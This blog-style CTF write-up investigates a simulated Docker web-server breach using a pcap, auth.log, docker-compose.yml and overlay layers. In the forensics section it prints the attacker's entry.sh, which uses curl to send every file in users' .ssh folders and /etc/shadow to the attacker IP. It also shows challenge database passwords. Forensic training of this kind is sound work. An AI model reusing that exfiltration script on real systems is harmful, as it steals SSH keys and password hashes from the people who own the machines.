---
weight: 4
title: "[TamuCTF 2019] - Microservices"
date: 2019-02-28T21:57:40+08:00
draft: false
author: "Maki"
authorLink: "https://www.maki.bzh"
description: ""
images: []
resources:
- name: "featured-image"
  src: "featured-image.png"

tags: ["tamuctf", "forensic", "network", "wireshark", "pcap", "cryptography", "docker"]
categories: ["Writeups"]

lightgallery: true
---

## 0_Intrusion

> Welcome to MicroServices inc, where do all things micro and service oriented!
> Recently we got an alert saying there was suspicious traffic on one of our web servers. Can you help us out?

| Filename | MD5 hash | Download link |
|----------|----------|---------------|
| microservice.pcap | 18d2c48f5d03d5faa5cb4473f9819b4b | https://mega.nz/#!Gv5zAahB!afQTRfSLEE93xDDoZbi0EoGLrGzshAALLCS-1LwykdY |

- What is the IP Address of the attacker?

For this flag I don't have any real analysis, I just opened the PCAP file and looked at the different TCP conversations. The IP that sends the most data and voila:


![](/lib/images/writeups/2019_tamuctf/microservice/0_intru_chall11.png)


> Flag: 10.91.9.93

## 1_Logs

> Thanks for discovering the malicious IP. We will add it to our block list. We also got a disk image of the web server while you were working. Can you dig a little deeper for us?

| Filename | MD5 | Download link |
|----------|-----|---------------|
| filesystem.image | 490c78e249177e6478539f459ca14e87 | https://drive.google.com/uc?id=19zgsmqMZ_QltLYzWcCdxizV9Wipj-2NI&export=download |

- What user was the attacker able to login as?
- What is the date & time that the attacker logged in? (MM/DD:HH:MM:SS)

Once the archive is finally downloaded, we'll mount it in readonly to avoid screwing everything inside:

```bash
▶ mkdir aaa
▶ sudo mount -o ro filesystem.image aaa
```

We know the attacker's IP (10.91.9.93) and we are looking for a connection. Let's see what the `auth.log` file contains:

```bash
➜  microservices cat aaa/var/log/auth.log | grep '10.91.9.93'
Feb 17 00:06:04 ubuntu-xenial sshd[15799]: Accepted publickey for root from 10.91.9.93 port 41592 ssh2: RSA SHA256:lR4653Hv/Y9QthWvXFB2KkNPzQ1r8mItv83OgiCAR4g
```

We got all flags immediately:

> Flag 1: root
> Flag 2: 02/17:00:06:04

## 2_Analysis

> Thanks for that information. Can you take a deeper dive now and figure out exactly how the attacker go in?

- What is the name of the service that was used to compromise the machine? (All lowercase)
- What is the md5sum of the initial compromising file?
- What specific line in the initial compromising file was the most dangerous? (Actual line, spaces in front don't matter)

During an investigation, my first reflex is to go to the folders of the different users (`/home`, `/root`):

```bash
➜  microservices tree -a -f aaa/root
aaa/root
├── aaa/root/.bashrc
├── aaa/root/.cache
│   └── aaa/root/.cache/motd.legal-displayed
├── aaa/root/.profile
└── aaa/root/.ssh
    ├── aaa/root/.ssh/authorized_keys
    └── aaa/root/.ssh/id_rsa

➜  microservices tree -a -f aaa/home
aaa/home
└── aaa/home/ubuntu
    ├── aaa/home/ubuntu/.ansible
    │   └── aaa/home/ubuntu/.ansible/tmp
    │       └── aaa/home/ubuntu/.ansible/tmp/ansible-tmp-1550362148.9-21461470003029
    │           └── aaa/home/ubuntu/.ansible/tmp/ansible-tmp-1550362148.9-21461470003029/command
    ├── aaa/home/ubuntu/.bash_logout
    ├── aaa/home/ubuntu/.bashrc
    ├── aaa/home/ubuntu/.cache
    │   └── aaa/home/ubuntu/.cache/motd.legal-displayed
    ├── aaa/home/ubuntu/.data
    │   ├── aaa/home/ubuntu/.data/mysql
    │   │   ├── aaa/home/ubuntu/.data/mysql/aria_log.00000001
    │   │   ├── aaa/home/ubuntu/.data/mysql/aria_log_control
    │   │   ├── aaa/home/ubuntu/.data/mysql/customers
    │   │   │   ├── aaa/home/ubuntu/.data/mysql/customers/customer_info.frm
    │   │   │   ├── aaa/home/ubuntu/.data/mysql/customers/customer_info.ibd
    │   │   │   └── aaa/home/ubuntu/.data/mysql/customers/db.opt
    │   │   ├── aaa/home/ubuntu/.data/mysql/ib_buffer_pool
    │   │   ├── aaa/home/ubuntu/.data/mysql/ibdata1
[LOOOOOOTS OF MYSQL FILES]
    │   │   ├── aaa/home/ubuntu/.data/mysql/performance_schema
    │   │   │   └── aaa/home/ubuntu/.data/mysql/performance_schema/db.opt
    │   │   └── aaa/home/ubuntu/.data/mysql/tc.log
    │   └── aaa/home/ubuntu/.data/redis
    ├── aaa/home/ubuntu/docker-compose.yml
    ├── aaa/home/ubuntu/id_rsa.pub
    ├── aaa/home/ubuntu/logs
    │   ├── aaa/home/ubuntu/logs/access.log
    │   ├── aaa/home/ubuntu/logs/error.log
    │   └── aaa/home/ubuntu/logs/other_vhosts_access.log
    ├── aaa/home/ubuntu/.profile
    ├── aaa/home/ubuntu/.ssh
    │   └── aaa/home/ubuntu/.ssh/authorized_keys
    └── aaa/home/ubuntu/.sudo_as_admin_successful

13 directories, 112 files
```

We will search in the `/etc/passwd` file if there are no other users who have can access to a __bash__:

```bash
➜  microservices cat aaa/etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
dev:x:0:0:root:/root:/bin/bash
```

It's funny, the user `dev` has `/root` as $HOME directory...

We see a `docker-composes.yml` file in the user's directory __ubuntu__:

```bash
➜  microservices cat aaa/home/ubuntu/docker-compose.yml 
version: '2'

services:
  web:
    image: tamuctf/webfront:latest
    restart: always
    ports:
      - "80:80"
    environment:
      - DATABASE_URL=mysql+pymysql://root:351BrE7aTQE8@db/customers
      - REDIS_URL=redis://cache:6379
    volumes:
      - ./logs:/var/log/apache2
      - /:/tmp
    depends_on:
      - db
    networks:
        default:
        internal:

  db:
    image: mariadb:10.2
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD=351BrE7aTQE8
      - MYSQL_USER=user
      - MYSQL_PASSWORD=e68Qc2s0HsyR
    volumes:
      - .data/mysql:/var/lib/mysql
    networks:
        internal:
    # This command is required to set important mariadb defaults
    command: [mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=28800, --log-warnings=0]

  cache:
    image: redis:4
    restart: always
    volumes:
    - .data/redis:/data
    networks:
        internal:

networks:
    default:
    internal:
        internal: true
```

If you're a little familiar with Docker, you've already found out where the attacker went. Line 13 of the file, the user is mounting the root directory in the /tmp folder of the container:

- /:/tmp

As a result, the attacker compromised the webfront and got access to the  host filesystem as `root` user. So he was able to retrieve the SSH private key from the host and logged in with.

The MD5 hash of the docker-composer.yml:

```bash
➜  microservices md5sum aaa/home/ubuntu/docker-compose.yml
a2111283f69aafcd658f558b0402fbc4  aaa/home/ubuntu/docker-compose.yml
```

> Flag 1: docker
> Flag 2: a2111283f69aafcd658f558b0402fbc4
> Flag 3: - /:/tmp

## 3_Forensics

> Thanks for that information. It seems that one of our developers didn't pay attention to what he was copying off of the internet. Can you help use figure out the extent of what the attacker was able to do?

- What are the last names of customers who got compromised? (alphabetical order, Capitalized first letter, comma separated ex: Asdf,Bsdf)
- What is the md5sum of the file that was used to exfiltrate data initially?
- What is the md5sum of the file that was stolen after the attacker logged in?

Something to know when you're doing forensic work with docker is: absolutely ALL about containers and other files/information related to this service is located here: `/var/lib/docker`.

Let's list the docker containers that have been used. We'll go looking for the one who climbs the root in the /tmp folder of the container:

```bash
➜  microservices ls aaa/var/lib/docker/containers 
90814f0051eed67a4dd291c8e3f44836c3cf3bd793818eba2e9ae7d0eedc661e
9e7b7ad707af6c0d04591d59e1b7570b784fc194c1847170d40bafc873da85d4
c7b26c91b07eef1f63c8ea3351477f2344e1873f2af8a1566954ecd0678982da
c8c5438a36920a02375b7fffba9065769a3657ee48d522b5ac9a8eec18b1ad84
```

Each container created contains a configuration file in JSON:

```bash
➜  microservices ls aaa/var/lib/docker/containers/*/config*
aaa/var/lib/docker/containers/90814f0051eed67a4dd291c8e3f44836c3cf3bd793818eba2e9ae7d0eedc661e/config.v2.json
aaa/var/lib/docker/containers/9e7b7ad707af6c0d04591d59e1b7570b784fc194c1847170d40bafc873da85d4/config.v2.json
aaa/var/lib/docker/containers/c7b26c91b07eef1f63c8ea3351477f2344e1873f2af8a1566954ecd0678982da/config.v2.json
aaa/var/lib/docker/containers/c8c5438a36920a02375b7fffba9065769a3657ee48d522b5ac9a8eec18b1ad84/config.v2.json

➜  microservices cat aaa/var/lib/docker/containers/*/config.v2.json | jq | grep -E '"ID"|"Image"'
  "ID": "90814f0051eed67a4dd291c8e3f44836c3cf3bd793818eba2e9ae7d0eedc661e",
    "Image": "tamuctf/kaliimage",
  "Image": "sha256:420f4338bea593a9a96151c51b3f5550fac8f7c29cb41c451b4d07c02cf9b28d",
  "ID": "9e7b7ad707af6c0d04591d59e1b7570b784fc194c1847170d40bafc873da85d4",
    "Image": "redis:4",
  "Image": "sha256:3ddb7885a5e075ba8ed414d0706059999aa73fceb4249bef7cb293c1ec559dfc",
  "ID": "c7b26c91b07eef1f63c8ea3351477f2344e1873f2af8a1566954ecd0678982da",
    "Image": "mariadb:10.2",
  "Image": "sha256:907f5f6c749d16ddd8f4a75353228a550d8eddd78693f4329c90ce51a99ec875",
  "ID": "c8c5438a36920a02375b7fffba9065769a3657ee48d522b5ac9a8eec18b1ad84",
    "Image": "tamuctf/webfront:latest",
  "Image": "sha256:05585189bd6cb140d5fcee52b95a05a202f3aa2ae62743a749d0d82bcacfbc5c",
```

A surprising image is here: __kaliimage__. Image Docker which has nothing to do on a web server...

In the `/var/lib/lib/docker/overlay2/` folder there are all the intermediate versions of the docker containers, in the form of a hash. Kind of like the commits for GitHub.

```bash
➜  microservices ls aaa/var/lib/docker/overlay2 
030086336adcdf22311680627f9ec604012ecf86ed7f87b2f20c21be94a7e91f
06aa47c261686f54296a2da65bfea7ed577ff79ce2263a320c95f73e2ad51db1
0bdd99e71211b7d42c48fc86936089b1766af62159e78554434d3b7762f88bb4
0dfa81ec47cc9d78701052f24ce164b114279abb425af227eb7664624d64c848
101c6052088fb1d7b9bf6331ae2e3a052a5480b14a5e48e43eb465914880cd68
146731568c44e1ab0d9a339166cd67189b51f6e0166b301f86557aef05b0d55d
[...]
``` 

Each of these folders has the same architecture:

```bash
➜  microservices tree aaa/var/lib/docker/overlay2/030086336adcdf22311680627f9ec604012ecf86ed7f87b2f20c21be94a7e91f 
aaa/var/lib/docker/overlay2/030086336adcdf22311680627f9ec604012ecf86ed7f87b2f20c21be94a7e91f
├── diff
│   └── etc
│       └── apt
│           └── sources.list
├── link
├── lower
└── work
```

The folder that will interest us will be the `diff` one, which bears its name well because it will record the differences between each container version. That's why Docker quickly becomes greedy in terms of disk size.

To find what interests me, I did something not very skilled, but which has is exhaustive:

```bash
➜  microservices ls aaa/var/lib/docker/overlay2/*/diff/
aaa/var/lib/docker/overlay2/0dfa81ec47cc9d78701052f24ce164b114279abb425af227eb7664624d64c848/diff/:
etc  tmp  usr  var

aaa/var/lib/docker/overlay2/101c6052088fb1d7b9bf6331ae2e3a052a5480b14a5e48e43eb465914880cd68/diff/:
etc  var

aaa/var/lib/docker/overlay2/146731568c44e1ab0d9a339166cd67189b51f6e0166b301f86557aef05b0d55d/diff/:
etc  lib  tmp  usr  var

aaa/var/lib/docker/overlay2/146d15695f9f4187544729bbd71682fe0fcebce1cd65becfc74f64f3278ea370/diff/:
run

aaa/var/lib/docker/overlay2/146d15695f9f4187544729bbd71682fe0fcebce1cd65becfc74f64f3278ea370-init/diff/:
dev  etc
[LOT OF RESUUUUUUUUULT]
```

But at a quick glance, I saw that an `entry.sh` file had been modified, nothing else on the docker's filesystem:

```bash
➜  microservices ls aaa/var/lib/docker/overlay2/*/diff/
[...]
aaa/var/lib/docker/overlay2/5d6f4f20fa15dd9d3960358e9b6e257821e3ab277a6ff4db92163d926e5c5e8a/diff/:
entry.sh
[...]

➜  microservices cat aaa/var/lib/docker/overlay2/5d6f4f20fa15dd9d3960358e9b6e257821e3ab277a6ff4db92163d926e5c5e8a/diff/entry.sh 
#!/bin/sh

if [ -n "$DATABASE_URL" ]
    then
    database=`echo $DATABASE_URL | awk -F[@//] '{print $4}'`
    echo "Waiting for $database to be ready"
    while ! mysqladmin ping -h $database --silent; do
        # Show some progress
        echo -n '.';
        sleep 1;
    done
    echo "$database is ready"
    # Give it another second.
    sleep 1;
fi

mysql -uroot -h db -p351BrE7aTQE8 -e 'CREATE DATABASE customers;\
                                USE customers;\
                                CREATE TABLE customer_info(LastName varchar(255), FirstName varchar(255), Email varchar(255), CreditCard varchar(255), Password varchar(255));\
                                INSERT INTO customer_info VALUES ("Meserole", "Andrew", "A@A.com", "378282246310005", "badpass1");\
                                INSERT INTO customer_info VALUES ("Billy", "Bob", "B@A.com", "371449635398431", "badpass2");\
                                INSERT INTO customer_info VALUES ("Suzy", "Joe", "S@A.com", "378734493671000", "badpass3");\
                                INSERT INTO customer_info VALUES ("John", "Doe", "J@A.com", "6011000990139424", "badpass4");\
                                INSERT INTO customer_info VALUES ("Frank", "Ferter", "F@A.com", "3566002020360505", "badpass5");\
                                INSERT INTO customer_info VALUES ("Orange", "Chair", "O@A.com", "4012888888881881", "badpass6");\
                                INSERT INTO customer_info VALUES ("Face", "Book", "C@A.com", "5105105105105100", "badpass7");\'

find /tmp/home -type d -name ".ssh" 2> /dev/null > /tmp/ljkasdhg
find /tmp/root -type d -name ".ssh" 2> /dev/null >> /tmp/ljkasdhg

sleep 2m;

while read line; do
    find $line -type f -exec curl -k -F 'data=@{}' https://10.91.9.93/ \;
done < /tmp/ljkasdhg

curl -k -F 'data=@/tmp/etc/shadow' https://10.91.9.93/

service apache2 stop;
apache2 -D FOREGROUND;
```


![](https://media.giphy.com/media/K90ckojkohXfW/giphy.gif)


It's Christmas, we found the file modified by the attacker and what allowed him to do yolo with the system. He modified database entries, retrieved `/etc/shadow`, information about users' `.ssh` folders.

The compromised users are therefore:

> Flag 1: Billy,Face,Frank,John,Meserole,Orange,Suzy

The file that was used to extract data from the data is therefore `entry.sh`:

> Flag 2: 14b0d800ce6f2882a6f058b45fc500c8

Still in the same perspective as to find the `entry.sh`, I listed the diff folders. In fact, I thought we were looking for a SQL backup or something like that, modifying a database without getting the backups is like ransomware that doesn't delete clear files...

```bash
➜  microservices ls aaa/var/lib/docker/overlay2/*/diff/
[...]
aaa/var/lib/docker/overlay2/e714d5d9a9c2b274dc598376078e089556081865d541bfa9aef768b1982ba0b3/diff/:
data-dump.sql  run  tmp
[...]

➜  microservices cat aaa/var/lib/docker/overlay2/e714d5d9a9c2b274dc598376078e089556081865d541bfa9aef768b1982ba0b3/diff/data-dump.sql
[BAD IDEA TOO MUCH DATA]

➜  microservices md5sum aaa/var/lib/docker/overlay2/e714d5d9a9c2b274dc598376078e089556081865d541bfa9aef768b1982ba0b3/diff/data-dump.sql
6d47d74d66e96c9bce2720c8a56f2558  aaa/var/lib/docker/overlay2/e714d5d9a9c2b274dc598376078e089556081865d541bfa9aef768b1982ba0b3/diff/data-dump.sql
```

> Flag 3: 6d47d74d66e96c9bce2720c8a56f2558

## 4_Persistence

> Thanks for that information. We are working on how to recover from this breach. One of the things we need to do is remove any backdoors placed by the attacker. Can you identify what the attacker left behind?

- What is the new user that was created?
- What is the full name of the new docker image that was pulled down?

This challenge was rather simple given the information found earlier. In step 2 (2_Analysis), I saw that the $HOME of the `dev` user is `/root`, so we suspect that it is the new user :

> Flag 1: dev

Then, when I started investigating on docker containers (cf. 3_Forensics), I saw an image __Kali__ named: `tamuctf/kaliimage`.

> Flag 2: tamuctf/kaliimage